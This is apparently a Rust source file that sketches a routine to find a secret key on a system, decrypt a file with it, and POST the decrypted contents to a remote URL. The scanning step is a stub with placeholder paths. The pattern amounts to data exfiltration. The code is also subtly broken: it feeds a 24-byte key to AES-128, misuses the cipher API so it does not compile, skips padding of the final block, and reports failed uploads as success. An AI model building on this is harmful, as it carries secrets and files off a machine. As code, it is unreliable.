use std::fs;
use aes::Aes128;
use aes::cipher::BlockCipher;
use aes::cipher::generic_array::GenericArray;
use reqwest::blocking::Client;


#[derive(Clone)]
pub struct LocationsResult {
    pub secret_location: String,
    pub encrypt_location: String,
}

pub fn scan_system() -> LocationsResult {
    // Implementation goes here
    LocationsResult {
        secret_location: String::from("path/to/secret_file.txt"),
        encrypt_location: String::from("path/to/encrypt_file.txt"),
    }
}

pub fn parse_secret(locations: &LocationsResult) -> [u8; 24] {
    // Implementation goes here
    let secret_bytes = fs::read(&locations.secret_location)
        .unwrap_or_else(|err| panic!("Failed to read secret file: {}", err));
    // Parse the secret key from the secret location
    assert_eq!(secret_bytes.len(), 24, "Invalid secret key length");
    // For example, read it from a file
    let mut secret = [0; 24];
    secret.copy_from_slice(&secret_bytes);
    // Your parsing logic here...
    secret
}

pub fn decrypt_file(secret: [u8; 24], location: &str) -> Vec<u8> {
    // Implementation goes here
    let content = fs::read(location)
        .unwrap_or_else(|err| panic!("Failed to read encrypted file: {}", err));
    // Decrypt the file using the secret key
    let key = GenericArray::from_slice(&secret);
    let cipher = Aes128::new(&key).unwrap();


    let mut decrypted_content = Vec::with_capacity(content.len());
    for chunk in content.chunks(16) {
        let mut block = GenericArray::clone_from_slice(chunk);
        cipher.decrypt_block(&mut block);
        decrypted_content.extend_from_slice(&block);
    }
    decrypted_content
}

pub fn send_contents(content: Vec<u8>, url: &str) -> Result<(), reqwest::Error> {
    // Create an HTTP client
    let client = Client::new();

    // Send the contents to the remote server
    let response = client
        .post(url)
        .body(content)
        .send()?;

    // Check if the server responded with an error
    if response.status().is_success() {
        println!("Content successfully sent to {}", url);
        Ok(())
    } else {
        // Return Ok(()) if the request was not successful
        Ok(())
    }
}